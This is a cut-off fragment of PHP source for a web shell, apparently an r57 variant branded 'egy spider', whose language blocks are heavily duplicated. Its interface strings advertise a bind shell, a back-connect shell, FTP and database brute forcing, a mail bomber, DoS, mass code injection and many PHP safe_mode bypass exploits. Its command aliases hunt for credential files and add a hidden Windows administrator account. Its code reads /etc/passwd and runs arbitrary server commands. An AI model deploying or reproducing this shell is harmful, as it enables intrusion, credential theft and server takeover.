'eng_text8' =>'Select alias',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_text30'=>'Cat file',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without arch.',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'/etc/passwd',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu)',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail() (PHP <= 4.0-4.2.2, 5.x)',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list() (PHP <= 5.1.2)',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body() (PHP <= 5.1.2)',
'eng_text115'=>'Test bypass safe_mode, copy file via copy(compress.zlib://) (PHP <= 4.4.2, 5.1.2)',
'eng_text116'=>'Copy from',
'eng_text117'=>'to',
'eng_text118'=>'File copied',
'eng_text119'=>'Cant copy file',
'eng_text120'=>'Test bypass safe_mode via ini_restore (PHP <= 4.4.4, 5.1.6) by NST',
'eng_text121'=>'Test bypass open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) by NST',
'eng_text122'=>'Test bypass open_basedir, view dir list via glob() (PHP <= 5.2.x)',
'eng_text123'=>'Test bypass open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)',
'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)',
'eng_text125'=>'Data',
'eng_text126'=>'Test bypass open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'eng_text127'=>'Test bypass open_basedir, add data to file via readfile(php://) (PHP <= 5.2.1, 4.4.4)',
'eng_text128'=>'Modify/Access file (touch)',
'eng_text129'=>'Test bypass open_basedir, create file via fopen(srpath://) (PHP v5.2.0)',
'eng_text130'=>'Test bypass open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'eng_text131'=>'Test bypass open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'eng_'=>'Test bypass open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'eng_text133'=>'Test bypass open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
'eng_text134'=>'Database-bruteforce',
'eng_text135'=>'Dictionary',
'eng_text136'=>'Creating evil symlink',
'eng_text137'=>'Useful',
'eng_text138'=>'Dangerous',
'eng_text139'=>'Mail Bomber',
'eng_text140'=>'DoS',
'eng_text141'=>'Danger! Web-daemon crash possible.',
'eng_text142'=>'Downloaders',
'eng_text143'=>'Temp: ',
'eng_text144'=>'Test bypass safe_mode with load file in mysqli',
'eng_text145'=>'Test bypass open_basedir, view dir list via realpath() (PHP <= 5.2.4)',
'eng_text146'=>'Max Interation',
'eng_text147'=>'',
'eng_text148'=>'',
'eng_text149'=>'',
'eng_text150'=>'',
'eng_err0'=>'Error! Can\'t write in file ',
'eng_err1'=>'Error! Can\'t read file ',
'eng_err2'=>'Error! Can\'t create ',
'eng_err3'=>'Error! Can\'t connect to ftp',
'eng_err4'=>'Error! Can\'t login on ftp server',
'eng_err5'=>'Error! Can\'t change dir on ftp',
'eng_err6'=>'Error! Can\'t sent mail',
'eng_err7'=>'Mail send',
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_butt65'=>'Create',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_butt14'=>'Download',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'FTP-server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without archivation',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu) login for password',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_butt15'=>'Send',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body',
'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()',
'eng_text116'=>'Copy from',
'eng_text117'=>'to',
'eng_text118'=>'File copied',
'eng_text119'=>'Cant copy file',
'eng_err0'=>'Error! Can\'t write in file ',
'eng_err1'=>'Error! Can\'t read file ',
'eng_err2'=>'Error! Can\'t create ',
'eng_err3'=>'Error! Can\'t connect to ftp',
'eng_err4'=>'Error! Can\'t login on ftp server',
'eng_err5'=>'Error! Can\'t change dir on ftp',
'eng_err6'=>'Error! Can\'t sent mail',
'eng_err7'=>'Mail send',
'eng_text200'=>'read file from vul copy()',
'eng_text500'=>'read file from id()',
'eng_text555'=>'read file from imap()',
'eng_text202'=>'where file in server',
'eng_text300'=>'read file from vul curl()',
'eng_text203'=>'read file from vul ini_restore()',
'eng_text204'=>'write shell from vul error_log()',
'eng_text205'=>'write shell in this side',
'eng_text206'=>'read dir',
'eng_text207'=>'read dir from vul reg_glob',
'eng_text208'=>'execute with function',
'eng_text209'=>'read dir from vul root',
'eng_text210'=>'DeZender ',
'eng_text211'=>'::safe_mode off::',
'eng_text212'=>'colse safe_mode with php.ini',
'eng_text213'=>'colse security_mod with .htaccess',
'eng_text214'=>'Admin name',
'eng_text215'=>'IRC server ',
'eng_text216'=>'#room name',
'eng_text217'=>'server',
'eng_text218'=>'write ini.php file to close safe_mode with ini_restore vul',
'eng_text225'=>'MySQL Safe Mode Bypass 4.4.7 / 5.2.3 PHP ',
'eng_text226'=>'Safe Mode Bpass Root Directory: ',
'eng_text227'=>'Safe_Mode Bypass 4.4.2/5.1.2: ',
'eng_text228'=>'tools for hacker vb ',
'eng_text230'=>'know pass of cpanel ',
'eng_text219'=>'Get file to server in safe_mode and change name',
'eng_text220'=>'show file with symlink vul',
'eng_text221'=>'zip file in server to download',
'eng_text222'=>'2 symlink use vul',
'eng_text223'=>'read file from funcution',
'eng_text224'=>'read file from PLUGIN ',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_butt3' =>'Bind',
'eng_butt4' =>'Connect',
'eng_butt5' =>'Run',
'eng_butt6' =>'Change',
'eng_butt7' =>'Show',
'eng_butt8' =>'Test',
'eng_butt9' =>'Dump',
'eng_butt10'=>'Save',
'eng_butt11'=>'Edit file',
'eng_butt12'=>'Find',
'eng_butt13'=>'Create/Delete',
'eng_butt14'=>'Download',
'eng_butt15'=>'Send',
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_text30'=>'Cat file',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions(PHP <= 4.4.2, 5.1.4)',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database . Table',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Database',
'eng_text40'=>'Dump database table',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server',
'eng_text86'=>'Download files from server',
'eng_text87'=>'Download files from remote ftp-server',
'eng_text88'=>'server:port',
'eng_text89'=>'File on ftp',
'eng_text90'=>'Transfer mode',
'eng_text91'=>'Archivation',
'eng_text92'=>'without arch.',
'eng_text93'=>'FTP',
'eng_text94'=>'FTP-bruteforce',
'eng_text95'=>'Users list',
'eng_text96'=>'Can\'t get users list',
'eng_text97'=>'checked: ',
'eng_text98'=>'success: ',
'eng_text99'=>'/etc/passwd',
'eng_text100'=>'Send file to remote ftp server',
'eng_text101'=>'Use reverse (user -> resu)',
'eng_text102'=>'Mail',
'eng_text103'=>'Send email',
'eng_text104'=>'Send file to email',
'eng_text105'=>'To',
'eng_text106'=>'From',
'eng_text107'=>'Subj',
'eng_text108'=>'Mail',
'eng_text109'=>'Hide',
'eng_text110'=>'Show',
'eng_text111'=>'SQL-Server : Port',
'eng_text112'=>'Test bypass safe_mode with function mb_send_mail() (PHP <= 4.0-4.2.2, 5.x)',
'eng_text113'=>'Test bypass safe_mode, view dir list via imap_list() (PHP <= 5.1.2)',
'eng_text114'=>'Test bypass safe_mode, view file contest via imap_body() (PHP <= 5.1.2)',
'eng_text115'=>'Test bypass safe_mode, copy file via copy(compress.zlib://) (PHP <= 4.4.2, 5.1.2)',
'eng_text116'=>'Copy from',
'eng_text117'=>'to',
'eng_text118'=>'File copied',
'eng_text119'=>'Cant copy file',
'eng_text120'=>'Test bypass safe_mode via ini_restore (PHP <= 4.4.4, 5.1.6) by NST',
'eng_text121'=>'Test bypass open_basedir, view dir list via fopen (PHP v4.4.0 memory leak) by NST',
'eng_text122'=>'Test bypass open_basedir, view dir list via glob() (PHP <= 5.2.x)',
'eng_text123'=>'Test bypass open_basedir, read *.bzip file via [compress.bzip2://] (PHP <= 5.2.1)',
'eng_text124'=>'Test bypass open_basedir, add data to file via error_log(php://) (PHP <= 5.1.4, 4.4.2)',
'eng_text125'=>'Data',
'eng_text126'=>'Test bypass open_basedir, create file via session_save_path[NULL-byte] (PHP <= 5.2.0)',
'eng_text127'=>'Test bypass open_basedir, add data to file via readfile(php://) (PHP <= 5.2.1, 4.4.4)',
'eng_text128'=>'Modify/Access file (touch)',
'eng_text129'=>'Test bypass open_basedir, create file via fopen(srpath://) (PHP v5.2.0)',
'eng_text130'=>'Test bypass open_basedir, read *.zip file via [zip://] (PHP <= 5.2.1)',
'eng_text131'=>'Test bypass open_basedir, view file contest via symlink() (PHP <= 5.2.1)',
'eng_text132'=>'Test bypass open_basedir, view dir list via symlink() (PHP <= 5.2.1)',
'eng_text133'=>'Test bypass open_basedir, create file via session_save_path(TMPDIR) (PHP <= 5.2.4)',
'eng_text134'=>'Database-bruteforce',
'eng_text135'=>'Dictionary',
'eng_text136'=>'Creating evil symlink',
'eng_text137'=>'Useful',
'eng_text138'=>'Dangerous',
'eng_text139'=>'Mail Bomber',
'eng_text140'=>'DoS',
'eng_text141'=>'Danger! Web-daemon crash possible.',
'eng_text142'=>'Downloaders',
'eng_text143'=>'Temp: ',
'eng_text144'=>'Test bypass safe_mode with load file in mysqli',
'eng_text145'=>'Test bypass open_basedir, view dir list via realpath() (PHP <= 5.2.4)',
'eng_text146'=>'Max Interation',
'eng_text151'=>'Test bypass safe_mode with chdir()and ftok() (PHP <= 5.2.6)',
'eng_text161'=>'Test bypass safe_mode with posix_access() (posix ext) (PHP <= 5.2.6)',
'eng_text162'=>'ionCube extension safe_mode and disable_functions protections bypass (PHP <= 5.2.4)',
'eng_text163'=>'PHP Perl Extension Safe_mode Bypass Exploit',
'eng_text170'=>' Test bypass safe_mode and Open_basedir Settings by Posix_getpw (PHP <= 4.2.0)',
'eng_text171'=>' PHP (Win32std) Extension safe_mode/disable_functions Protections Bypass (PHP <= 5.2.3)',
'eng_text147'=>'',
'eng_text148'=>'',
'eng_text149'=>'',
'eng_text150'=>'',
'eng_text159'=>'About egy spider',
'eng_text152'=>'Latest News',
'eng_text153'=>'Logout ',
'eng_text154'=>'Quick index ',
'eng_text155'=>'Mass Code Injection ',
'eng_text156'=>'File source ',
'eng_text157'=>'Registration in Zone-h ',
'eng_text158'=>'Hash Tools  ',
'eng_text160'=>'Home Shell  ',
'eng_text180'=>'Send Your Comments And Contacted Me ',
'eng_err0'=>'Error! Can\'t write in file ',
'eng_err1'=>'Error! Can\'t read file ',
'eng_err2'=>'Error! Can\'t create ',
'eng_err3'=>'Error! Can\'t connect to ftp',
'eng_err4'=>'Error! Can\'t login on ftp server',
'eng_err5'=>'Error! Can\'t change dir on ftp',
'eng_err6'=>'Error! Can\'t sent mail',
'eng_err7'=>'Mail send',

);
/*
?????? ??????
????????? ???????? ????????????? ?????? ????? ? ???-?? ??????. ( ??????? ????????? ???? ????????? ???? )
?? ?????? ???? ????????? ??? ???????? ???????.
*/
$aliases=array(
'----------------------------------locate'=>'',
'find httpd.conf files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate httpd.conf files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate vhosts.conf files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate proftpd.conf files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate psybnc.conf'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate my.conf files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate admin.php files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate cfg.php files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate conf.php files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate config.dat files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate config.php files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate config.inc files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate config.inc.php files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate config.default.php files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate .conf files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate .pwd files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate .sql files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate .htpasswd files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate .bash_history files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate .mysql_history files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate backup files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate dump files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate priv files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'locate vhosts.conf files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'________________find orders ______________-'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'cat /var/cpanel/accounting.log'=>'cat /var/cpanel/accounting.log',
'find all site of server and user'=>'ls -la /etc/valiases',
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'________________var orders var______________-'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ error_log files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ access.log files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ error.log files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'find /var/ &quot;*.log&quot; files'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'________________for server windows ______________-'=>'/tmp/grep.txt;cat /tmp/grep.txt',
'1_learn the management server'=>'net user',
'2_add new user'=>'net user egy_spider 123456 /add',
'3_add your user for admin group (this order after add order 1&2'=>'net localgroup administrators egy_spider /add',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#333333><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Webdings color=gray>4</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=Verdana size=-2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if(isset($_GET['users'])) 
 { 
 if(!$users=get_users('/etc/passwd')) { echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
 else 
  { 
  echo '<center>';
  foreach($users as $user) { echo $user."<br>"; }
  echo '</center>';
  }
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>"; die(); 
 }

if (!empty($_POST['dir'])) { if(@function_exists('chdir')){@chdir($_POST['dir']);} else if(@function_exists('chroot')){ @chroot($_POST['dir']);}; }
if (empty($_POST['dir'])){if(@function_exists('chdir')){$dir = @getcwd();};}else{$dir=$_POST['dir'];}
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $unix=0; else $unix=1;
if(empty($dir))
 { 
 $os = getenv('OS');
 if(empty($os)){ $os = @php_uname(); } 
 if(empty($os)){ $os ="-"; $unix=1; } 
 else
    {
    if(@eregi("^win",$os)) { $unix = 0; }
    else { $unix = 1; }
    }
 }

if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
	
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=Verdana size=-2><b>".ws(3);
        $r .= (!$unix)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
          $r .= "<TD><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>";
  die(); 
  }                                                          

/*if(!$safe_mode && strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }*/
if(strpos(ex("echo abcr57"),"r57")!=3) { $safe_mode = 1; }else{$safe_mode = 0;}
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }

function ws($i)
{
return @str_repeat("&nbsp;",$i);
}

function ex($cfe)
{global $unix,$tempdir;
 $res = '';
 if (!empty($cfe))
 {
  if(@function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(@function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(@function_exists('system'))
   {
    @ob_start();
    @system('$cfe');
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@function_exists('popen') && @is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fread($f,1024); }
   }else if(@function_exists('fgets') && @function_exists('feof')){
    while(!@feof($f)) { $res .= @fgets($f,1024); }
   }
   @pclose($f);
  }
  elseif(@function_exists('proc_open') && @is_resource($f = @proc_open($cfe,array(1 => array("pipe", "w")),$pipes)))
  {
   $res = "";
   if(@function_exists('fread') && @function_exists('feof')){
    while(!@feof($pipes[1])) {$res .= @fread($pipes[1], 1024);}
   }else if(@function_exists('fgets') && @function_exists('feof')){
